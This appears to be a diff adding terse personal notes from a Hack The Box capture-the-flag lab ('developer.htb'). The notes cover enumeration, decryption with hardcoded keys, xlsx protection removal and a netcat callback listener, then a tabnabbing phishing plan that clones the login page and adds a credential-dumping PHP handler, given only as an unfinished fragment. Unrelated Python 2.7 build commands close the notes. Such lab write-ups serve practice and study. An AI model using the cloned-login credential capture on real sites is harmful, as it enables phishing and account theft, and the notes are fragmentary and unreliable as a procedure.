@@ -1,0 +1,38 @@
+nmap & edit /etc/hosts -> <ip> developer.htb
+
+go to http://developer.htb/
+gobuster dir -u http://developer.htb/ -w /opt/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -> Find admin login page
+sign up, log in
+
+Forensic
+  1.move the file to windows, dnspy open the file -> look for main
+    main has long base64 encoded string -> base64 decode -> give encrypt function
+    browse "function Encrypt-String($String, $Passphrase, $salt" -> find code that matches -> get Decode-String function
+    -> $Passphrase = 'AmazinglyStrongPassword', $salt= 'CrazilySimpleSalt', $init= 'StupidlyEasy_IV'
+    -> run the function; $encrypted = 'X/o8VJQE1pyQhjmpcwk45+L069bivpF63PjZP4z7ahKaC+jv89NT6ze0T5id0lWC'; $decrypted = Decrypt-String $encrypted; echo $decrypted
+  2.phished_list.xlsx -> unzip -> grep -iR sheetprotect . -> remove that tag and zip -r <newname.xlsx> . -> can unhide column and get flag
+
+Submit a walkthrough -> http://<my ip>/<whatever>
+sudo nc -nlvp 80 -> get callback
+
+--tabnab phishing
+wget -r http://developer.htb/accounts/login 
+-> edit admin.html: delete any script tags, and add the dumping function in the end
+  <?php if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+  django cookie - <payload>:<time stamp>:<signature>
+
+sudo apt update
+sudo apt install -y build-essential libssl-dev zlib1g-dev libncurses5-dev \
+libncursesw5-dev libreadline-dev libsqlite3-dev libgdbm-dev \
+libdb5.3-dev libbz2-dev libexpat1-dev liblzma-dev tk-dev wget
+cd /usr/src
+sudo wget https://www.python.org/ftp/python/2.7.18/Python-2.7.18.tgz
+sudo tar xzf Python-2.7.18.tgz
+cd Python-2.7.18
+sudo ./configure --prefix=/usr/local/python2
+
+  sudo make -j$(nproc)
+
+  sudo make install
+  echo 'export PATH=/usr/local/python2/bin:$PATH' >> ~/.bashrc
+source ~/.bashrc
